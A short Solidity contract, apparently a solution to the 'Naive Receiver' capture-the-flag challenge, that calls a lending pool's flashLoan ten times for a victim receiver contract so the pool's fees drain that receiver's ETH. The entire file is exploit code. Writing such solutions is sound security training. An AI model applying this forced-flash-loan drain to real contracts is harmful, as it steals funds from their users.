// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveExploit {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address payable private poolAddress;
    NaiveReceiverLenderPool private pool;

    uint256 private flashLoanAmount = 1000 ether;
    uint256 private numFlashLoans = 10;

    constructor(address payable _poolAddress, IERC3156FlashBorrower _receiver) {
        poolAddress = _poolAddress;
        pool = NaiveReceiverLenderPool(poolAddress);

        for (uint256 i = 0; i < numFlashLoans; i++) {
            pool.flashLoan(_receiver, ETH, flashLoanAmount, "");
        }
    }
}
